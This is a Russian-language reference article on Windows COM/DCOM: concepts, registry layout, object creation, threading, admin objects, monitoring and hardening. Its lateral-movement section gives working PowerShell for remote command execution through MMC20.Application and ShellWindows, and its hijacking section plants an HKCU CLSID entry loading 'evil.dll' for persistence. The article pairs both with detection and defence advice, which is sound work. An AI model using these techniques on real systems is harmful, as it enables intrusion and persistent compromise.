---
title: "Windows - COM/DCOM объекты"
date: "2026-05-15"
---

COM (Component Object Model) - бинарный стандарт для взаимодействия между программными компонентами в Windows. Не зависит от языка программирования: один объект написан на C++, другой использует его из Python или PowerShell - это работает. DCOM (Distributed COM) расширяет это на сетевые вызовы. Понимание COM нужно для системного администрирования, автоматизации, пентеста и разработки.

---

## Основные концепции

```
COM объект - экземпляр класса, реализующий один или несколько интерфейсов.

Интерфейс - набор методов с фиксированными сигнатурами.
  Все COM интерфейсы наследуют IUnknown:
    QueryInterface(riid, ppvObject) - получить другой интерфейс объекта
    AddRef()                        - увеличить счётчик ссылок
    Release()                       - уменьшить счётчик ссылок (освободить при 0)

GUID (Globally Unique Identifier) - 128-битный уникальный идентификатор.
  Формат: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
  Используется для идентификации классов и интерфейсов.

CLSID (Class ID) - GUID конкретного COM класса.
  Пример: {00021401-0000-0000-C000-000000000046} = Shell Link (ярлыки)

IID (Interface ID) - GUID конкретного интерфейса.
  Пример: {000214F9-0000-0000-C000-000000000046} = IShellLink

ProgID (Programmatic ID) - человекочитаемое имя класса.
  Примеры: "Shell.Application", "Excel.Application", "Scripting.FileSystemObject"
  ProgID → CLSID: через реестр HKCR\<ProgID>\CLSID\

Сервер (COM Server) - DLL или EXE содержащий реализацию COM классов:
  In-Process Server (DLL) - загружается в адресное пространство клиента
  Local Server (EXE)      - отдельный процесс, IPC через LPC/ALPC
  Remote Server (EXE)     - другой компьютер, IPC через DCOM/RPC
```

### Реестровая основа COM

```
Вся конфигурация COM хранится в реестре.

HKEY_CLASSES_ROOT\CLSID\{CLSID}\
  (Default)         = "Friendly name"
  InprocServer32\
    (Default)       = "C:\path\to\server.dll"
    ThreadingModel  = "Apartment" | "Free" | "Both" | "Neutral"
  LocalServer32\
    (Default)       = "C:\path\to\server.exe"
  ProgID\
    (Default)       = "App.Object"

HKEY_CLASSES_ROOT\<ProgID>\
  (Default)         = "Friendly Name"
  CLSID\
    (Default)       = "{CLSID}"

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\   (системные, для всех пользователей)
HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\    (пользовательские, только текущий)
  (HKCR = объединение HKLM\SOFTWARE\Classes + HKCU\SOFTWARE\Classes)

Найти CLSID по ProgID:
  reg query "HKCR\Shell.Application\CLSID"
  # Ответ: {13709620-C279-11CE-A49E-444553540000}

Найти DLL по CLSID:
  reg query "HKCR\CLSID\{13709620-C279-11CE-A49E-444553540000}\InprocServer32"
```

---

## Создание COM объектов

### PowerShell

```powershell
# Создать объект по ProgID
$shell = New-Object -ComObject "Shell.Application"
$fso   = New-Object -ComObject "Scripting.FileSystemObject"
$ie    = New-Object -ComObject "InternetExplorer.Application"
$wmi   = New-Object -ComObject "WbemScripting.SWbemLocator"

# Создать по CLSID (когда нет ProgID)
$obj = [Activator]::CreateInstance([Type]::GetTypeFromCLSID(
    [Guid]"{13709620-C279-11CE-A49E-444553540000}"
))

# Создать на удалённом компьютере (DCOM)
$obj = [Activator]::CreateInstance(
    [Type]::GetTypeFromProgID("Shell.Application", "SERVER01")
)

# Просмотреть методы и свойства объекта
$shell | Get-Member
$shell | Get-Member -MemberType Method
($shell | Get-Member).where({$_.MemberType -eq "Method"}).Name

# Практические примеры:
# Открыть папку в Explorer
$shell.Open("C:\Windows")

# Получить список всех запущенных окон
$shell.Windows() | Select-Object LocationName, LocationURL

# Файловая система через COM
$fso.GetDrive("C:").FreeSpace / 1GB
$fso.FolderExists("C:\Temp")
$fso.CreateTextFile("C:\Temp\test.txt", $true).Write("hello")

# Перечислить файлы
$folder = $fso.GetFolder("C:\Windows\System32")
$folder.Files | Select-Object Name, Size | Sort-Object Size -Descending | Select-Object -First 10
```

### C# / .NET

```csharp
// Через Type.GetTypeFromProgID
Type shellType = Type.GetTypeFromProgID("Shell.Application");
dynamic shell = Activator.CreateInstance(shellType);
shell.Open(@"C:\");

// Через COM interop (если есть TLB/ссылка на COM библиотеку)
// В проекте: Add Reference → COM → Microsoft Shell Controls And Automation
// using Shell32;
// Shell shell = new Shell();
// shell.Open(@"C:\");

// Освобождение COM объекта
System.Runtime.InteropServices.Marshal.ReleaseComObject(shell);
```

### C++ (нативный COM)

```cpp
#include <objbase.h>
#include <shlobj.h>

int main() {
    // Инициализация COM (всегда первым делом)
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    IShellLink* pLink = nullptr;

    // Создать COM объект
    HRESULT hr = CoCreateInstance(
        CLSID_ShellLink,          // какой класс создать
        nullptr,                  // outer (для aggregation)
        CLSCTX_INPROC_SERVER,     // где создать (in-process DLL)
        IID_IShellLink,           // какой интерфейс получить
        (void**)&pLink            // куда записать указатель
    );

    if (SUCCEEDED(hr)) {
        pLink->SetPath(L"C:\\Windows\\notepad.exe");

        // QueryInterface - получить другой интерфейс того же объекта
        IPersistFile* pFile = nullptr;
        hr = pLink->QueryInterface(IID_IPersistFile, (void**)&pFile);
        if (SUCCEEDED(hr)) {
            pFile->Save(L"C:\\Temp\\notepad.lnk", TRUE);
            pFile->Release();  // всегда Release!
        }
        pLink->Release();
    }

    CoUninitialize();
    return 0;
}

// CLSCTX варианты:
// CLSCTX_INPROC_SERVER  - DLL в текущем процессе
// CLSCTX_LOCAL_SERVER   - EXE на той же машине (другой процесс)
// CLSCTX_REMOTE_SERVER  - EXE на другой машине (DCOM)
// CLSCTX_ALL            - Windows выбирает сам (in-proc, затем local, затем remote)
```

---

## Threading Models

```
Threading model определяет в каком потоке можно вызывать методы COM объекта.
Это критично для понимания маршалинга и производительности.

Apartment (STA - Single-Threaded Apartment):
  Объект живёт в одном конкретном потоке.
  Вызовы из других потоков маршалируются через очередь сообщений Windows.
  Поток должен быть инициализирован: CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)
  Примеры: большинство старых COM объектов, все UI-объекты

MTA (Multi-Threaded Apartment):
  Объект может вызываться из любого потока MTA одновременно.
  Объект сам отвечает за thread safety (мьютексы и т.д.).
  Инициализация: CoInitializeEx(NULL, COINIT_MULTITHREADED)
  Примеры: ADODB, высокопроизводительные COM серверы

Both:
  Поддерживает и STA и MTA - вызывается прямо в том потоке, который вызвал.
  Самый гибкий и производительный вариант.

Neutral (NTA):
  Специальный Neutral Apartment - вызывается в специальном потоке без маршалинга.
  Редко используется.

Маршалинг между апартментами:
  Если STA-объект вызывается из другого потока - COM создаёт proxy/stub.
  Proxy - объект в вызывающем потоке, перенаправляющий вызовы.
  Stub  - объект в потоке объекта, принимающий вызовы.
  Между потоками: ALPC (Advanced Local Procedure Call).
  Накладные расходы: намного выше чем прямой вызов.

Правило: всегда создавать COM объект в том же потоке, где будешь его использовать.
```

---

## DCOM - Distributed COM

```
DCOM = COM + сетевой транспорт (MSRPC поверх TCP).
Позволяет создавать COM объекты на удалённых машинах и вызывать их методы.

Порты:
  TCP 135  - RPC Endpoint Mapper (узнать какой порт использует DCOM сервер)
  TCP 445  - SMB (для аутентификации)
  TCP 49152-65535 - динамически выделяемые порты для DCOM соединений

Конфигурация DCOM:
  dcomcnfg.exe → Component Services → Computers → My Computer → DCOM Config
  Или: HKLM\SOFTWARE\Microsoft\OLE

Ключевые настройки (реестр):
  HKLM\SOFTWARE\Microsoft\OLE\
    EnableDCOM = "Y"            # включить DCOM
    LegacyAuthenticationLevel  # уровень аутентификации
    LegacyImpersonationLevel   # уровень impersonation

На уровне конкретного класса:
  HKCR\AppID\{AppID}\
    LaunchPermission   # кто может запустить DCOM сервер
    AccessPermission   # кто может вызывать методы
    RunAs             # от чьего имени запускается (пустой = launching user)
```

### Уровни безопасности DCOM

```
Authentication Level (HKLM\SOFTWARE\Microsoft\OLE\LegacyAuthenticationLevel):
  1 = None           - без аутентификации
  2 = Connect        - аутентификация при подключении
  3 = Call           - каждый вызов аутентифицируется
  4 = Packet         - каждый пакет аутентифицируется
  5 = PacketIntegrity- пакет + проверка целостности
  6 = PacketPrivacy  - пакет + шифрование (рекомендуется)

Impersonation Level:
  1 = Anonymous      - клиент анонимен
  2 = Identify       - сервер знает кто клиент, но не действует от его имени
  3 = Impersonate    - сервер действует от имени клиента (локальные ресурсы)
  4 = Delegate       - сервер может делегировать клиента другим серверам

PowerShell - удалённый DCOM:
  # Подключиться к WMI через DCOM (устаревший способ, но работает)
  $wmi = [WMIClass]"\\SERVER01\root\cimv2:Win32_Process"
  $wmi.Create("notepad.exe")

  # Через Type.GetTypeFromProgID
  $obj = [Activator]::CreateInstance(
      [Type]::GetTypeFromProgID("WScript.Shell", "SERVER01")
  )
  $obj.Run("cmd.exe /c whoami > C:\Temp\out.txt")
```

### DCOM Lateral Movement

```
DCOM активно используется для lateral movement в пентесте.
Преимущества перед PSExec: нет записи сервиса, меньше логов.

Популярные DCOM классы для LM:

1. MMC20.Application ({49B2791A-B1AE-4C90-9B8E-E860BA07F889})
   Метод: Document.ActiveView.ExecuteShellCommand
   
   $obj = [Activator]::CreateInstance(
       [Type]::GetTypeFromProgID("MMC20.Application", "TARGET")
   )
   $obj.Document.ActiveView.ExecuteShellCommand(
       "cmd.exe", $null, "/c whoami > C:\Temp\out.txt", "7"
   )

2. ShellWindows ({9BA05972-F6A8-11CF-A442-00A0C90A8F39})
   Метод: через ShellExecute
   
   $obj = [Activator]::CreateInstance(
       [Type]::GetTypeFromCLSID([Guid]"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", "TARGET")
   )
   $item = $obj.Item()
   $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)

3. ShellBrowserWindow ({C08AFD90-F2A1-11D1-8455-00A0C91F3880})
   Аналогично ShellWindows

4. Excel.Application / Word.Application (если Office установлен)
   Метод: Run макрос или запуск через Shell

Требования:
  - Учётные данные локального администратора на цели
  - DCOM не заблокирован файрволлом (TCP 135 + dynamic ports)
  - RemoteRegistry или аналог для некоторых методов

Обнаружение:
  EventID 4688 (Process Creation) на целевой машине
  EventID 4624 (Logon Type 3 = Network)
  Sysmon EventID 10 (ProcessAccess) если DCOM запускает процессы
```

---

## COM Hijacking

```
COM Hijacking - атака на механизм поиска COM классов.
Windows ищет CLSID в HKCU перед HKLM.
Если создать запись HKCU\SOFTWARE\Classes\CLSID\{CLSID} -
она перехватит вызовы системного COM объекта.

Почему это работает:
  1. Процесс вызывает CoCreateInstance({CLSID})
  2. Windows ищет {CLSID} в HKCU\SOFTWARE\Classes\CLSID\ → НАШЁЛ
  3. Загружает DLL указанную в HKCU (вместо системной из HKLM)
  4. Наша DLL выполняется в контексте этого процесса

Поиск уязвимых CLSIDs (отсутствуют в HKCU, есть в HKLM, вызываются процессами):
  # Через Process Monitor:
  # Фильтр: Operation=RegOpenKey AND Path contains HKCU\Software\Classes\CLSID AND Result=NAME NOT FOUND
  # Это покажет все CLSID которые ищутся в HKCU но не найдены

Пример - hijack задачи планировщика (persistence):
  # Найти CLSID вызываемый при логине (через procmon + Task Scheduler)
  # Создать запись:
  $clsid = "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
  $regPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
  New-Item -Path $regPath -Force
  Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Temp\evil.dll"
  Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"

  # При следующем вызове этого CLSID - загрузится evil.dll

Популярные CLSIDs для hijacking (persistence через Scheduled Tasks):
  {BCDE0395-E52F-467C-8E3D-C4579291692E} - встроенная задача Windows
  {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D} - встроенная задача Windows

Защита:
  Мониторинг HKCU\SOFTWARE\Classes\CLSID\ на создание новых записей
  Process Monitor / Autoruns показывает hijacked COM записи
  Autoruns.exe (Sysinternals) → вкладка "COM Hijacks"
```

---

## Полезные COM объекты для администрирования

### Shell.Application

```powershell
$shell = New-Object -ComObject Shell.Application

# Открыть диалог "Выполнить" (Run dialog)
$shell.FileRun()

# Получить список всех открытых окон Explorer
$shell.Windows() | ForEach-Object {
    [PSCustomObject]@{
        Name     = $_.LocationName
        URL      = $_.LocationURL
        Visible  = $_.Visible
    }
}

# Найти папку по known folder ID (CSIDL)
$desktop = $shell.NameSpace(0)         # Desktop
$myDocs  = $shell.NameSpace(5)         # My Documents
$sysRoot = $shell.NameSpace(37)        # System32
$appData = $shell.NameSpace(26)        # AppData\Roaming

# Распаковать ZIP через COM (без внешних утилит!)
$zip = $shell.NameSpace("C:\archive.zip")
$dest = $shell.NameSpace("C:\Extracted")
$dest.CopyHere($zip.Items())           # распаковать всё
```

### WScript.Shell

```powershell
$wsh = New-Object -ComObject WScript.Shell

# Выполнить команду
$wsh.Run("notepad.exe")
$wsh.Run("cmd.exe /c dir C:\", 0, $true)  # 0=скрытое окно, $true=ждать

# Получить значение переменной окружения
$wsh.ExpandEnvironmentStrings("%USERPROFILE%")
$wsh.ExpandEnvironmentStrings("%COMPUTERNAME%")

# Создать ярлык
$lnk = $wsh.CreateShortcut("$env:DESKTOP\MyApp.lnk")
$lnk.TargetPath = "C:\MyApp\app.exe"
$lnk.Arguments = "--config prod.ini"
$lnk.WorkingDirectory = "C:\MyApp"
$lnk.IconLocation = "C:\MyApp\app.exe, 0"
$lnk.Save()

# Работа с реестром
$wsh.RegRead("HKCU\Software\MyApp\Setting")
$wsh.RegWrite("HKCU\Software\MyApp\Setting", "value", "REG_SZ")
$wsh.RegDelete("HKCU\Software\MyApp\Setting")

# Отправить нажатие клавиш (SendKeys)
$wsh.AppActivate("Notepad")
$wsh.SendKeys("Hello World{ENTER}")
$wsh.SendKeys("%{F4}")   # Alt+F4
```

### Scripting.FileSystemObject

```powershell
$fso = New-Object -ComObject Scripting.FileSystemObject

# Диски
$fso.Drives | Select-Object DriveLetter, DriveType, @{N="FreeGB";E={[math]::Round($_.FreeSpace/1GB,2)}}

# Файлы
$fso.FileExists("C:\Windows\notepad.exe")
$fso.CopyFile("C:\source.txt", "C:\dest.txt", $true)
$fso.MoveFile("C:\old.txt", "C:\new.txt")
$fso.DeleteFile("C:\unwanted.txt")
$fso.GetFile("C:\file.txt").Size

# Папки
$fso.FolderExists("C:\Temp")
$fso.CreateFolder("C:\Temp\NewDir")
$fso.CopyFolder("C:\Source", "C:\Dest", $true)
$fso.DeleteFolder("C:\Temp\OldDir", $true)

# Чтение/запись файлов
$file = $fso.OpenTextFile("C:\file.txt", 1)  # 1=ForReading
while (!$file.AtEndOfStream) {
    $line = $file.ReadLine()
    Write-Host $line
}
$file.Close()

$out = $fso.CreateTextFile("C:\out.txt", $true)
$out.WriteLine("Line 1")
$out.Close()

# Временный файл
$tmpFile = $fso.GetTempName()   # случайное имя
$tmpPath = $fso.GetSpecialFolder(2)  # 2 = Temp folder path
```

### MSXML2.XMLHTTP / WinHttp

```powershell
# HTTP запросы через COM (без PowerShell Invoke-WebRequest)
# Полезно для обхода ограничений и в старых средах

$http = New-Object -ComObject MSXML2.XMLHTTP.6.0
$http.Open("GET", "https://example.com/file.txt", $false)
$http.Send()
$content = $http.ResponseText
$status  = $http.Status

# Скачать бинарный файл
$http = New-Object -ComObject MSXML2.XMLHTTP.6.0
$http.Open("GET", "https://example.com/tool.exe", $false)
$http.Send()

$stream = New-Object -ComObject ADODB.Stream
$stream.Type = 1  # adTypeBinary
$stream.Open()
$stream.Write($http.ResponseBody)
$stream.SaveToFile("C:\Temp\tool.exe", 2)  # 2 = adSaveCreateOverWrite
$stream.Close()

# WinHttp (более современный)
$winhttp = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$winhttp.Open("GET", "https://example.com/api", $false)
$winhttp.SetRequestHeader("Authorization", "Bearer TOKEN")
$winhttp.Send()
$winhttp.ResponseText
```

### Microsoft.XMLDOM - работа с XML

```powershell
$xml = New-Object -ComObject Microsoft.XMLDOM
$xml.Async = $false
$xml.Load("C:\config.xml")

# XPath запросы
$nodes = $xml.SelectNodes("//server[@enabled='true']")
foreach ($node in $nodes) {
    Write-Host $node.GetAttribute("name")
}

$node = $xml.SelectSingleNode("//database/connection")
$node.Text

# Создать XML документ
$xml = New-Object -ComObject Microsoft.XMLDOM
$root = $xml.CreateElement("config")
$child = $xml.CreateElement("setting")
$child.SetAttribute("name", "timeout")
$child.Text = "30"
$root.AppendChild($child)
$xml.AppendChild($root)
$xml.Save("C:\newconfig.xml")
```

---

## Исследование COM объектов

### Перечисление через реестр

```powershell
# Все зарегистрированные COM классы (HKLM)
$clsids = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue
$clsids | ForEach-Object {
    $name = (Get-ItemProperty $_.PSPath)."(default)"
    $server = (Get-ItemProperty "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue)."(default)"
    if ($name) {
        [PSCustomObject]@{
            CLSID  = $_.PSChildName
            Name   = $name
            Server = $server
        }
    }
} | Where-Object Name | Sort-Object Name | Format-Table -AutoSize

# Все ProgID зарегистрированные в системе
Get-ChildItem "HKCR:\" -ErrorAction SilentlyContinue |
    Where-Object { $_.GetSubKeyNames() -contains "CLSID" } |
    Select-Object PSChildName |
    Sort-Object PSChildName

# Найти COM объекты конкретного приложения (например Office)
Get-ChildItem "HKCR:\" |
    Where-Object { $_.PSChildName -match "^Excel\." -or $_.PSChildName -match "^Word\." } |
    Select-Object PSChildName
```

### OleView и другие инструменты

```
OleView (oleview.exe) - встроен в Windows SDK:
  Показывает все зарегистрированные COM серверы
  Браузер по интерфейсам и TypeLib
  Можно instantiate объект и вызвать методы

OleViewDotNet (GitHub: tyranid/OleViewDotNet):
  Современная версия OleView с поддержкой .NET
  Поиск по CLSID/ProgID/интерфейсу
  Просмотр DCOM permissions
  Генерация C# кода для работы с объектом
  Незаменим для исследования COM в безопасности

PowerShell - получить TypeLib информацию:
  # Получить все методы COM объекта через рефлексию
  $shell = New-Object -ComObject Shell.Application
  $type = $shell.GetType()
  $type.GetMethods() | Select-Object Name | Sort-Object Name

  # Через интерфейс IDispatch (для late binding)
  $shell | Get-Member | Where-Object MemberType -eq "Method"

Process Monitor (procmon):
  Поймать какие CLSID загружаются процессом:
  Фильтр: Operation=RegOpenKey AND Path contains CLSID
```

---

## Безопасность COM/DCOM

### Права доступа к COM объектам

```
Два уровня контроля доступа к COM объектам:

1. Launch Permissions - кто может запустить COM сервер
   HKCR\AppID\{AppID}\LaunchPermission
   
2. Access Permissions - кто может вызывать методы уже запущенного COM
   HKCR\AppID\{AppID}\AccessPermission

Если явные права не заданы - используются машинные defaults:
   HKLM\SOFTWARE\Microsoft\OLE\DefaultLaunchPermission
   HKLM\SOFTWARE\Microsoft\OLE\DefaultAccessPermission

Просмотр DCOM прав через dcomcnfg.exe:
  Component Services → Computers → My Computer → DCOM Config
  → Правый клик на объект → Properties → Security вкладка

Проверить права через accesschk (Sysinternals):
  accesschk.exe -ol "Excel.Application"     # launch permissions
  accesschk.exe -oa "Excel.Application"     # access permissions
```

### Мониторинг COM активности

```powershell
# Event Log для COM/DCOM

# DCOM ошибки (распространённые):
Get-WinEvent -LogName "System" |
    Where-Object { $_.ProviderName -eq "Microsoft-Windows-DistributedCOM" } |
    Select-Object TimeCreated, Id, Message |
    Format-Table -Wrap

# EventID 10016 - DCOM access denied (самый частый)
# Означает что процесс пытается запустить DCOM объект без нужных прав
Get-WinEvent -FilterHashtable @{LogName='System'; Id=10016} -MaxEvents 20 |
    ForEach-Object {
        [PSCustomObject]@{
            Time    = $_.TimeCreated
            Message = $_.Message.Substring(0, [Math]::Min(200, $_.Message.Length))
        }
    } | Format-Table -Wrap

# Решение EventID 10016:
# dcomcnfg → найти AppID из сообщения → настроить Launch/Access permissions

# Sysmon для отслеживания COM загрузки DLL:
# EventID 7 (ImageLoad) с путём к COM DLL покажет что загружается
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 7 -and $_.Message -match "CLSID" } |
    Select-Object TimeCreated, Message -First 10
```

### Hardening DCOM

```powershell
# Отключить DCOM полностью (агрессивно, может сломать сервисы)
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\OLE" -Name "EnableDCOM" -Value "N"
# ТРЕБУЕТ ПЕРЕЗАГРУЗКУ. Применять только если уверен что DCOM не нужен.

# Ограничить DCOM только аутентифицированными пользователями
# Через dcomcnfg → My Computer → Properties → COM Security
# Default Access Permissions → Edit Limits → убрать Everyone, оставить Authenticated Users

# Включить максимальный уровень аутентификации DCOM
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\OLE" `
    -Name "LegacyAuthenticationLevel" -Value 6  # 6 = Packet Privacy (шифрование)

Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\OLE" `
    -Name "LegacyImpersonationLevel" -Value 2   # 2 = Identify (не impersonate)

# Файрвол - ограничить DCOM порты
# Если DCOM не нужен по сети - заблокировать TCP 135 входящий
New-NetFirewallRule -DisplayName "Block DCOM Remote" `
    -Direction Inbound -Protocol TCP -LocalPort 135 `
    -Action Block -Profile Domain,Private,Public
```

---

## Шпаргалка

```
КЛЮЧЕВЫЕ ПОНЯТИЯ
  CLSID     - GUID класса {xxxxxxxx-...}
  IID       - GUID интерфейса
  ProgID    - имя класса "App.Object"
  AppID     - GUID для настройки безопасности DCOM
  IUnknown  - базовый интерфейс всех COM объектов (QI, AddRef, Release)

РЕЕСТР
  HKCR\CLSID\{CLSID}\InprocServer32  - DLL сервер
  HKCR\CLSID\{CLSID}\LocalServer32   - EXE сервер
  HKCR\<ProgID>\CLSID                 - CLSID по ProgID
  HKCU\SOFTWARE\Classes\CLSID\       - переопределение (COM hijacking!)
  HKCR\AppID\{AppID}\LaunchPermission - кто может запустить DCOM

THREADING MODELS
  Apartment (STA) - один поток, маршалинг для других
  Free (MTA)      - любой поток, объект thread-safe
  Both            - гибкий, прямой вызов
  CoInitializeEx(NULL, COINIT_APARTMENTTHREADED) для STA
  CoInitializeEx(NULL, COINIT_MULTITHREADED) для MTA

СОЗДАНИЕ ОБЪЕКТОВ
  PowerShell: New-Object -ComObject "ProgID"
  PowerShell DCOM: [Activator]::CreateInstance([Type]::GetTypeFromProgID("ProgID","SERVER"))
  C++: CoCreateInstance(CLSID, NULL, CLSCTX_*, IID, &ptr)

ПОЛЕЗНЫЕ PROGID
  Shell.Application          - Explorer/Shell операции
  WScript.Shell              - Run, SendKeys, реестр, ярлыки
  Scripting.FileSystemObject - файловая система
  MSXML2.XMLHTTP.6.0         - HTTP запросы
  WinHttp.WinHttpRequest.5.1 - HTTP (более современный)
  Microsoft.XMLDOM           - XML парсинг/создание
  ADODB.Stream               - бинарные потоки данных

DCOM LATERAL MOVEMENT
  MMC20.Application → Document.ActiveView.ExecuteShellCommand(...)
  ShellWindows CLSID {9BA05972-...} → Item().Document.Application.ShellExecute(...)
  Требует: локальный Admin на цели + TCP 135 открыт

COM HIJACKING
  HKCU\SOFTWARE\Classes\CLSID\ проверяется ПЕРЕД HKLM
  Procmon фильтр: RegOpenKey + NAME NOT FOUND + CLSID → найти кандидатов
  Autoruns.exe → вкладка COM Hijacks → увидеть существующие

ИНСТРУМЕНТЫ
  dcomcnfg.exe   - настройка DCOM прав
  oleview.exe    - SDK, браузер COM объектов
  OleViewDotNet  - современный анализ COM (GitHub)
  accesschk.exe  - проверить права на DCOM объект
  Autoruns.exe   - обнаружить COM hijacking

EVENT IDS
  System 10016  - DCOM доступ запрещён (Access Denied)
  Security 4688 - создание процесса через DCOM
```

---

## Ссылки

- [COM Technical Overview](https://learn.microsoft.com/en-us/windows/win32/com/com-technical-overview) - официальная документация
- [CoCreateInstance](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance) - создание COM объектов
- [DCOM Security](https://learn.microsoft.com/en-us/windows/win32/com/dcom-security-enhancements-in-windows-xp-sp2-and-windows-server-2003-sp1) - безопасность DCOM
- [COM Threading Models](https://learn.microsoft.com/en-us/windows/win32/com/processes--threads--and-apartments) - потоки и апартменты
- [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) - анализ COM (James Forshaw)
- [MITRE T1559.001: COM](https://attack.mitre.org/techniques/T1559/001/) - COM в атаках
- [MITRE T1021.003: DCOM Lateral Movement](https://attack.mitre.org/techniques/T1021/003/) - DCOM LM
- [COM Hijacking Research](https://attack.mitre.org/techniques/T1546/015/) - COM hijacking persistence
